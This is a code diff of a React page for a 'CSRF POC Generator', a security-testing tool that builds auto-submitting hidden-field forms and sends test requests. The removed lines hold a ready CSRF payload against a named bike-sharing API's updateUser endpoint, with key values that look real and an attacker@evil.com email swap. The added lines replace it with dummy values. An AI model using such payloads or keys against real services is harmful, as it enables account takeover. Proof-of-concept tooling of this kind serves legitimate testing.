@@ -1,59 +1,74 @@
-'use client';
+"use client";
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect } from "react";
+import { Button } from "@/app/components/ui/button";
+import { Input } from "@/app/components/ui/input";
+import { Textarea } from "@/app/components/ui/textarea";
+
+interface Param {
+  name: string;
+  value: string;
+}
+
+interface Payload {
+  action: string;
+  method: "POST" | "GET";
+  params: Param[];
+}
+
+interface TestResult {
+  status: number;
+  response: string;
+  headers: Record<string, string>;
+}
 
 export default function Home() {
-  const [payload, setPayload] = useState({
-    action: 'http://api.nextbike.net/api/updateUser.xml',
-    method: 'POST',
+  const [payload, setPayload] = useState<Payload>({
+    action: "https://example.com/api/update",
+    method: "POST",
     params: [
-      { name: 'apikey', value: 'VzFxVgTA5K8Rsk1F' },
-      { name: 'loginkey', value: '8L9aJf61u58G9Ts3' },
-      { name: 'email', value: 'attacker@evil.com' }
-    ]
+      { name: "api_key", value: "dummy_api_key_123" },
+      { name: "user_id", value: "user_123" },
+      { name: "action", value: "update_profile" },
+    ],
   });
 
-  const [generatedHTML, setGeneratedHTML] = useState('');
-  const [testResult, setTestResult] = useState<{ status: number; response: string } | null>(null);
+  const [generatedHTML, setGeneratedHTML] = useState("");
+  const [testResult, setTestResult] = useState<TestResult | null>(null);
   const [isLoading, setIsLoading] = useState(false);
 
-  // Function to parse HTML and extract form data
   const parseHTML = (html: string) => {
     try {
       const parser = new DOMParser();
-      const doc = parser.parseFromString(html, 'text/html');
-      const form = doc.querySelector('form');
-      
+      const doc = parser.parseFromString(html, "text/html");
+      const form = doc.querySelector("form");
       if (form) {
-        const action = form.getAttribute('action') || '';
-        const method = form.getAttribute('method')?.toUpperCase() || 'POST';
+        const action = form.getAttribute("action") || "";
+        const method = (form.getAttribute("method")?.toUpperCase() ||
+          "POST") as "POST" | "GET";
         const inputs = form.querySelectorAll('input[type="hidden"]');
-        
-        const params = Array.from(inputs).map(input => ({
-          name: input.getAttribute('name') || '',
-          value: input.getAttribute('value') || ''
+        const params = Array.from(inputs).map((input) => ({
+          name: input.getAttribute("name") || "",
+          value: input.getAttribute("value") || "",
         }));
-
-        setPayload({
-          action,
-          method,
-          params
-        });
+        setPayload({ action, method, params });
       }
     } catch (error) {
-      console.error('Error parsing HTML:', error);
+      console.error("Error parsing HTML:", error);
     }
   };
 
-  // Generate HTML from form data
   const generateHTML = () => {
     const html = `
 <html>
   <body>
     <form action="${payload.action}" method="${payload.method}">
-      ${payload.params.map(param => 
-        `<input type="hidden" name="${param.name}" value="${param.value}" />`
-      ).join('\n      ')}
+      ${payload.params
+        .map(
+          (param) =>
+            `<input type="hidden" name="${param.name}" value="${param.value}" />`
+        )
+        .join("\n      ")}
       <input type="submit" value="Submit request" />
     </form>
     <script>
@@ -62,64 +77,73 @@ export default function Home() {
     </script>
   </body>
 </html>`;
-
     setGeneratedHTML(html);
   };
 
-  // Update HTML when form data changes
   useEffect(() => {
-    if (payload.params.length > 0) {
-      generateHTML();
-    }
+    if (payload.params.length > 0) generateHTML();
   }, [payload]);
 
   const addParam = () => {
-    setPayload(prev => ({
+    setPayload((prev) => ({
       ...prev,
-      params: [...prev.params, { name: '', value: '' }]
+      params: [...prev.params, { name: "", value: "" }],
     }));
   };
 
   const removeParam = (index: number) => {
-    setPayload(prev => ({
+    setPayload((prev) => ({
       ...prev,
-      params: prev.params.filter((_, i) => i !== index)
+      params: prev.params.filter((_, i) => i !== index),
     }));
   };
 
-  const updateParam = (index: number, field: 'name' | 'value', value: string) => {
-    setPayload(prev => ({
+  const updateParam = (index: number, field: keyof Param, value: string) => {
+    setPayload((prev) => ({
       ...prev,
-      params: prev.params.map((param, i) => 
+      params: prev.params.map((param, i) =>
         i === index ? { ...param, [field]: value } : param
-      )
+      ),
     }));
   };
 
   const testPayload = async () => {
     setIsLoading(true);
     setTestResult(null);
-
     try {
       const formData = new FormData();
-      payload.params.forEach(param => {
+      payload.params.forEach((param) => {
         formData.append(param.name, param.value);
       });
 
       const response = await fetch(payload.action, {
         method: payload.method,
         body: formData,
-        mode: 'no-cors'
+      });
+
+      // Get the raw response text
+      const responseText = await response.text();
+      console.log("Raw response:", responseText);
+
+      // Get all response headers
+      const headers: Record<string, string> = {};
+      response.headers.forEach((value, key) => {
+        headers[key] = value;
       });
 
       setTestResult({
         status: response.status,
-        response: await response.text()
+        response: responseText,
+        headers: headers,
       });
     } catch (error) {
+      console.error("Fetch error:", error);
       setTestResult({
         status: 0,
-        response: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`
+        response: `Error: ${
+          error instanceof Error ? error.message : "Unknown error"
+        }`,
+        headers: {},
       });
     } finally {
       setIsLoading(false);
@@ -128,119 +152,144 @@ export default function Home() {
 
   return (
     <div className="min-h-screen bg-primary text-white">
-      <div className="container">
-        <div className="py-12">
-          <div className="flex justify-between items-center mb-12">
-            <h1 className="text-3xl font-primary text-accent tracking-wider">CSRF POC Generator</h1>
-            <button
-              onClick={testPayload}
-              disabled={!generatedHTML || isLoading}
-              className="h-[48px] px-8 bg-accent text-primary rounded-full hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95 font-semibold uppercase tracking-[2px] text-sm disabled:opacity-50 disabled:cursor-not-allowed"
+      <div className="container py-12">
+        <div className="flex justify-between items-center mb-12">
+          <h1 className="text-3xl font-primary text-accent tracking-wider">
+            CSRF POC Generator
+          </h1>
+          <Button
+            onClick={testPayload}
+            disabled={!generatedHTML || isLoading}
+            variant="default"
+            size="lg"
+          >
+            {isLoading ? "Testing..." : "Test Payload"}
+          </Button>
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+          {/* Left Column - Form Fields */}
+          <div className="space-y-8">
+            <Input
+              value={payload.action}
+              onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
+                setPayload((prev) => ({ ...prev, action: e.target.value }))
+              }
+              placeholder="Target URL"
+            />
+
+            <select
+              value={payload.method}
+              onChange={(e: React.ChangeEvent<HTMLSelectElement>) =>
+                setPayload((prev) => ({
+                  ...prev,
+                  method: e.target.value as "POST" | "GET",
+                }))
+              }
+              className="w-full h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
             >
-              {isLoading ? 'Testing...' : 'Test Payload'}
-            </button>
-          </div>
-          
-          <div className="grid grid-cols-2 gap-8">
-            {/* Left Column - Form Fields */}
-            <div className="space-y-8">
-              <div>
-                <input
-                  type="text"
-                  value={payload.action}
-                  onChange={(e) => setPayload(prev => ({ ...prev, action: e.target.value }))}
-                  placeholder="Target URL"
-                  className="w-full h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
-                />
+              <option value="POST">POST</option>
+              <option value="GET">GET</option>
+            </select>
+
+            <div>
+              <div className="flex justify-between items-center mb-6">
+                <h2 className="font-primary text-accent text-xl tracking-wider">
+                  Parameters
+                </h2>
+                <Button onClick={addParam} variant="default" size="default">
+                  Add Param
+                </Button>
               </div>
 
-              <div>
-                <select
-                  value={payload.method}
-                  onChange={(e) => setPayload(prev => ({ ...prev, method: e.target.value }))}
-                  className="w-full h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
-                >
-                  <option value="POST">POST</option>
-                  <option value="GET">GET</option>
-                </select>
-              </div>
-
-              <div>
-                <div className="flex justify-between items-center mb-6">
-                  <h2 className="font-primary text-accent text-xl tracking-wider">Parameters</h2>
-                  <button
-                    onClick={addParam}
-                    className="h-[44px] px-6 bg-accent text-primary rounded-full hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95 font-semibold"
+              {payload.params.map((param, index) => (
+                <div key={index} className="flex gap-4 mb-4">
+                  <Input
+                    value={param.name}
+                    onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
+                      updateParam(index, "name", e.target.value)
+                    }
+                    placeholder="Name"
+                  />
+                  <Input
+                    value={param.value}
+                    onChange={(e: React.ChangeEvent<HTMLInputElement>) =>
+                      updateParam(index, "value", e.target.value)
+                    }
+                    placeholder="Value"
+                  />
+                  <Button
+                    onClick={() => removeParam(index)}
+                    variant="default"
+                    size="default"
+                    className="w-[44px] p-0"
                   >
-                    Add Param
-                  </button>
+                    ×
+                  </Button>
                 </div>
-                
-                {payload.params.map((param, index) => (
-                  <div key={index} className="flex gap-4 mb-4">
-                    <input
-                      type="text"
-                      value={param.name}
-                      onChange={(e) => updateParam(index, 'name', e.target.value)}
-                      placeholder="Name"
-                      className="flex-1 h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
-                    />
-                    <input
-                      type="text"
-                      value={param.value}
-                      onChange={(e) => updateParam(index, 'value', e.target.value)}
-                      placeholder="Value"
-                      className="flex-1 h-[44px] px-6 bg-primary border border-accent rounded-full focus:border-accent-hover focus:outline-none transition-colors text-base"
-                    />
-                    <button
-                      onClick={() => removeParam(index)}
-                      className="h-[44px] w-[44px] bg-accent text-primary rounded-full hover:bg-accent-hover transition-all duration-300 transform hover:scale-105 active:scale-95 font-semibold flex items-center justify-center"
-                    >
-                      ×
-                    </button>
-                  </div>
-                ))}
-              </div>
+              ))}
+            </div>
+          </div>
+
+          {/* Right Column - HTML Editor */}
+          <div className="space-y-8">
+            <div className="bg-primary/50 p-8 rounded-2xl border border-accent">
+              <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">
+                HTML Payload:
+              </h2>
+              <Textarea
+                value={generatedHTML}
+                onChange={(e: React.ChangeEvent<HTMLTextAreaElement>) => {
+                  setGeneratedHTML(e.target.value);
+                  parseHTML(e.target.value);
+                }}
+                className="h-[400px] font-mono"
+                spellCheck="false"
+              />
             </div>
 
-            {/* Right Column - HTML Editor */}
-            <div className="space-y-8">
+            {/* Test Results */}
+            {testResult && (
               <div className="bg-primary/50 p-8 rounded-2xl border border-accent">
-                <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">HTML Payload:</h2>
-                <textarea
-                  value={generatedHTML}
-                  onChange={(e) => {
-                    setGeneratedHTML(e.target.value);
-                    parseHTML(e.target.value);
-                  }}
-                  className="w-full h-[400px] p-6 bg-primary rounded-xl text-sm font-mono border border-accent focus:border-accent-hover focus:outline-none transition-colors"
-                  spellCheck="false"
-                />
-              </div>
-
-              {/* Test Results */}
-              {testResult && (
-                <div className="bg-primary/50 p-8 rounded-2xl border border-accent">
-                  <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">Test Results:</h2>
-                  <div className="space-y-6">
-                    <div className="flex items-center gap-2">
-                      <span className="text-accent font-semibold">Status:</span>
-                      <span className={`px-4 py-1 rounded-full text-sm font-semibold ${
-                        testResult.status === 200 ? 'bg-green-500/20 text-green-500' : 'bg-red-500/20 text-red-500'
-                      }`}>
-                        {testResult.status}
-                      </span>
-                    </div>
-                    <div>
-                      <span className="text-accent font-semibold block mb-3">Response:</span>
-                      <pre className="bg-primary p-6 rounded-xl text-sm overflow-x-auto border border-accent">
-                        {testResult.response}
-                      </pre>
-                    </div>
+                <h2 className="font-primary text-accent mb-6 text-xl tracking-wider">
+                  Test Results:
+                </h2>
+                <div className="space-y-6">
+                  <div className="flex items-center gap-2">
+                    <span className="text-accent font-semibold">Status:</span>
+                    <span
+                      className={`px-4 py-1 rounded-full text-sm font-semibold ${
+                        testResult.status === 200
+                          ? "bg-green-500/20 text-green-500"
+                          : "bg-red-500/20 text-red-500"
+                      }`}
+                    >
+                      {testResult.status}
+                    </span>
+                  </div>
+                  <div>
+                    <span className="text-accent font-semibold block mb-3">
+                      Response:
+                    </span>
+                    <pre className="bg-primary p-6 rounded-xl text-sm overflow-x-auto border border-accent">
+                      {testResult.response}
+                    </pre>
+                  </div>
+                  <div>
+                    <span className="text-accent font-semibold block mb-3">
+                      Headers:
+                    </span>
+                    <pre className="bg-primary p-6 rounded-xl text-sm overflow-x-auto border border-accent">
+                      {testResult.headers
+                        ? Object.entries(testResult.headers)
+                            .map(([key, value]) => `${key}: ${value}`)
+                            .join("\n")
+                        : "No headers available"}
+                    </pre>
                   </div>
                 </div>
-              )}
-            </div>
+              </div>
+            )}
           </div>
         </div>
       </div>
